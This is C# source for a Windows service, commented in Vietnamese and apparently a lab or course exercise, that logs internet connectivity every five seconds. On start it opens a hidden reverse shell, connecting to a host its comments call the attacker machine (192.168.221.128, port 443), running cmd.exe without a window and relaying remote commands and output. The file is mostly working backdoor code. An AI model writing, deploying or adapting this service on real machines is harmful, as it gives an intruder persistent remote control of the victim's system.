using System;
using System.ServiceProcess;
using System.Timers;
using System.Net;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;


namespace BT_3
{
    public partial class Service1 : ServiceBase
    {
        private Timer timer = new Timer();
        System.Threading.Thread thread;

        static StreamWriter strmw;

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            //Kiểm tra Internet
            timer.Elapsed += new ElapsedEventHandler(OnElapse_Check);
            timer.Interval = 5000;
            timer.Enabled = true;

            // Gọi hàm tạo Reverse Shell trong luồng xử lí mới
            // trước khi thực hiện khởi tạo, giả định cần phải có kết nối internet do đó thực hiện kiểm tra
            if (CheckNetConnection())
            {
                thread = new System.Threading.Thread(CreateReverseShell);

                thread.Start(); 
            }
        }

        protected override void OnStop()
        {
            // Ngưng kích hoạt event
            timer.Enabled = false;

            // Ngắt luồng xử lí
            thread.Abort();
        }
        // Kiểm tra kết nối internet, sau đó ghi thông điệp kết quả kèm thời gian tương ứng vào file log
        // Có -> "Success"
        // Không -> "Failure"
        // Không xác định -> "Unknow"
        protected void OnElapse_Check(Object source, ElapsedEventArgs e)
        {
            string Message = "Unknown";
            if (CheckNetConnection())
            {
                Message = "Success";
            }
            else
            {
                Message = "Failure";
            }

            WriteToFile(Message + DateTime.Now.ToString("   dd/MM/yyyy hh:mm:ss"));
        }

        protected bool CheckNetConnection()
        {
            // xác định uri trang web cần truy cập
            string url = @"http://www.google.com";

            // nếu thuận lợi truy cập web thành công -> trả về true
            // nếu không thể truy cập trang web (web server chắc chắn alive), xảy ra exception -> trả về false
            try
            {
                // dùng using để dọn dẹp đôi tượng khởi tạo dù có xảy ra exception
                using (WebClient wb = new WebClient())
                // thực hiện kết nối - đọc resource của web page từ url chỉ định
                using (wb.OpenRead(url))
                    return true;

            }
            catch (Exception ex)
            {
                return false;
            }
        }
        
        protected void CreateReverseShell()
        {
            // Thực hiện kết nối đến máy attacker
            using (TcpClient client = new TcpClient("192.168.221.128", 443))
            { 
                // Lấy luồng dữ liệu từ kết nối
                using (Stream strm = client.GetStream())
                { 
                    // hỗ trợ đọc từ luồng dữ liệu
                    using (StreamReader strmr = new StreamReader(strm))
                    { 
                        // hỗ trợ ghi vào luồng dữ liệu
                        strmw = new StreamWriter(strm);

                        // hỗ trợ chứa dữ liệu đọc,
                        // tiện dụng vì có thể thay đổi nội dung trong bộ nhớ
                        StringBuilder strbInput = new StringBuilder();

                        // khởi tạo đổi tượng để mở tiến trình Command Prompt
                        Process prcs = new Process();

                        prcs.StartInfo.FileName = "cmd.exe";
                        // Chạy tiến trình ngầm, không hiển thị của sổ
                        prcs.StartInfo.CreateNoWindow = true;
                        // Không cần "graphic shell", như vậy
                        // cho phép các luồng input, output, error của tiến trình được redirect
                        prcs.StartInfo.UseShellExecute = false;
                        // redirect ouput đến luồng đầu ra chuẩn
                        prcs.StartInfo.RedirectStandardOutput = true;
                        // redirect input đến luồng đầu vào chuẩn
                        prcs.StartInfo.RedirectStandardInput = true;
                        // redirect error đến luồng đầu ra lỗi chuẩn
                        prcs.StartInfo.RedirectStandardError = true;
                        // sự kiện được kích hoạt mỗi khi các chuẩn output, error
                        // được ghi vào các luồng đầu ra được thiết lập
                        prcs.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);

                        // Chạy tiến trình
                        prcs.Start();
                        // Đọc ouput, error từ các luồng đầu ra được thiết lập một cách bất đồng bộ
                        prcs.BeginOutputReadLine();

                        // Vòng lập để phục vụ việc ghi dữ liệu vào process
                        while (true)
                        {
                            // lấy dữ liệu từ luồng rồi ghi vào stringbuilder
                            strbInput.Append(strmr.ReadLine());
                            // ghi dữ liệu nhận được từ stringbuilder vào process
                            prcs.StandardInput.WriteLine(strbInput);
                            // Làm trống stringbuilder
                            strbInput.Remove(0, strbInput.Length);
                        }

                    }
                }
            }
        }

        protected void CmdOutputDataHandler(object sender, DataReceivedEventArgs e)
        {
            StringBuilder strbOutput = new StringBuilder();
            // kiểm tra dữ liệu output và error của tiến trình
            // được ghi vào luồng đầu ra và truy xuất thông qua biến e.Data
            if (!String.IsNullOrEmpty(e.Data))
            {
                try
                {
                    strbOutput.Append(e.Data);
                    // ghi dữ liệu nhận được từ tiến trình vào luồng giao tiếp
                    strmw.WriteLine(strbOutput);
                    // xóa bộ đệm của luồng dữ liệu
                    strmw.Flush();
                }
                catch(Exception ex) 
                { 
                    //
                }
            }
        }

        protected void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
                ".txt";
            if (!File.Exists(filepath))
            {
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
    }
}
